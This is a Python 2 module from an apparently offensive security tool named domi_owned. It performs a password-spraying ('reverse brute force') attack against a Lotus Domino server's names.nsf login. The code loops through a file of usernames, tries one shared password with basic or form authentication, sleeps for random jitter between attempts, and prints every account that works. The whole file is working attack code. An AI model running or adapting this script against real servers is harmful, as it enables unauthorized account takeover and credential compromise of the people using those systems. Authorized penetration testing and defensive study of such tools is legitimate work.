# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import random
import re
import requests
import time

from domi_owned import utility

try:
	requests.packages.urllib3.disable_warnings()
except:
	pass

# Preform a reverse brute force against names.nsf
def reverse_bruteforce(target, usernames, password, auth):
	username_list = []
	valid_usernames = []

	names_url = "{0}/names.nsf".format(target)

	# Import usernames from file
	username_file = open(usernames, 'r')
	for username in username_file:
		username_list.append(username.rstrip())
	username_file.close()

	# Start reverse brute force
	for username in username_list:
		jitter = random.random()
		time.sleep(jitter)
		try:
			if auth == 'basic':
				access = utility.basic_auth(names_url, username, password)
			elif auth == 'form':
				access, session = utility.form_auth(names_url, username, password)
			elif auth == 'open':
				utility.print_good("{0} does not require authentication".format(names_url))
				break
			else:
				utility.print_warn("Could not find {0}!".format(names_url))
				break

			if access:
				utility.print_good("Found a valid account: {0} {1}".format(username, password))
				valid_usernames.append(username)
			else:
				pass

		except KeyboardInterrupt:
			break
		except Exception as error:
			utility.print_error("Error: {0}".format(error))
			continue

	# Print found usernames
	if len(valid_usernames) > 0:
		if len(valid_usernames) == 1:
			plural = ''
		else:
			plural = 's'
		utility.print_status("Found {0} valid account{1}...".format(len(valid_usernames), plural))

		for valid_username in valid_usernames:
			print "{0} {1}".format(valid_username, password)
	else:
		utility.print_warn('No valid accounts found!')
